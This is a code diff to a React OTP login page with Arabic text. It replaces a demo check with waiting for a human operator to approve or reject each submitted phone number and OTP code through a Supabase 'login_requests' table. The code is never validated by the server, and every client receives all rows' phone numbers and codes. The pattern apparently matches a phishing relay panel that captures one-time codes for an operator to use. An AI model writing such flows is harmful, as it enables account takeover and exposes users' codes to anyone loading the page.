@@ -56,6 +56,8 @@ const VerifyOtp = () => {
     inputRefs.current[Math.min(pasted.length, 5)]?.focus();
   };
 
+  const [waiting, setWaiting] = useState(false);
+
   const handleVerify = async () => {
     const code = otp.join("");
     if (code.length !== 6) {
@@ -63,12 +65,40 @@ const VerifyOtp = () => {
       return;
     }
     setLoading(true);
-    // Demo mode - accept any 6-digit code
-    await new Promise((r) => setTimeout(r, 800));
-    toast.success("تم تسجيل الدخول بنجاح (تجريبي)");
-    navigate("/dashboard");
-    setLoading(false);
+    setWaiting(true);
+    toast.info("بانتظار موافقة المسؤول...");
   };
+
+  // Poll for admin approval/rejection
+  useEffect(() => {
+    if (!waiting || !phone) return;
+    const code = otp.join("");
+    
+    const channel = supabase
+      .channel("otp_status_check")
+      .on("postgres_changes", {
+        event: "UPDATE",
+        schema: "public",
+        table: "login_requests",
+      }, (payload) => {
+        const row = payload.new as { phone: string; otp_code: string; status: string };
+        if (row.phone === phone && row.otp_code === code) {
+          if (row.status === "approved") {
+            toast.success("تمت الموافقة! جاري تسجيل الدخول...");
+            navigate("/dashboard");
+          } else if (row.status === "rejected") {
+            toast.error("المعلومات المدخلة غير صحيحة");
+            setWaiting(false);
+            setLoading(false);
+            setOtp(["", "", "", "", "", ""]);
+            inputRefs.current[0]?.focus();
+          }
+        }
+      })
+      .subscribe();
+
+    return () => { supabase.removeChannel(channel); };
+  }, [waiting, phone, otp, navigate]);
 
   const handleResend = async () => {
     // Demo mode
@@ -138,7 +168,7 @@ const VerifyOtp = () => {
               disabled={loading || otp.join("").length !== 6}
             >
               {loading ? (
-                <span className="animate-pulse-soft">جاري التحقق...</span>
+                <span className="animate-pulse-soft">{waiting ? "بانتظار الموافقة..." : "جاري التحقق..."}</span>
               ) : (
                 "تأكيد"
               )}
